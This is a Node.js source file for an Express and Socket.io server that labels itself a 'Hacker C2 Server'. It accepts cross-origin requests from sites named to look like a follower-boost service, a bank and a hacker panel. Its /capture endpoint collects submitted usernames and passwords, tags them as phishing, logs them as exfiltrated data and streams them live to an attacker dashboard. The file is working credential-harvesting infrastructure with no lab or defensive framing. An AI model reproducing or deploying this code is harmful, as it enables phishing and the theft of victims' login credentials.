const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// 1. Define allowed origins clearly
const allowedOrigins = [
    "https://instafollowersboost12.netlify.app",
    "https://globaldigitalbank1.netlify.app",
    "https://hackerspanel.netlify.app"
];

app.use(cors({
    origin: allowedOrigins,
    methods: ["GET", "POST"],
    credentials: true
}));

app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));

const server = http.createServer(app);

// 2. Properly initialize Socket.io with the SAME CORS settings
const io = new Server(server, {
    cors: {
        origin: allowedOrigins,
        methods: ["GET", "POST"]
    }
});

/* ===== Socket Events ===== */
io.on("connection", (socket) => {
    console.log("🟢 Hacker dashboard connected:", socket.id);
    socket.on("disconnect", () => {
        console.log("🔴 Hacker dashboard disconnected:", socket.id);
    });
});

/* ===== Capture Endpoint ===== */
app.post('/capture', (req, res) => {
    const logEntry = {
        time: new Date().toLocaleTimeString(),
        user: req.body.user || "unknown",
        pass: req.body.pass || "***",
        type: req.body.type || "PHISHING"
    };

    console.log("📡 Exfiltrated Data:", logEntry);

    // Broadcast data to your dashboard
    io.emit('new_data', logEntry);

    res.status(200).json({ status: "Captured", data: logEntry });
});

app.get("/", (req, res) => {
    res.send("Hacker C2 Server Running 🚀");
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
    console.log(`🔥 Hacker Stream Server running on port ${PORT}`);
});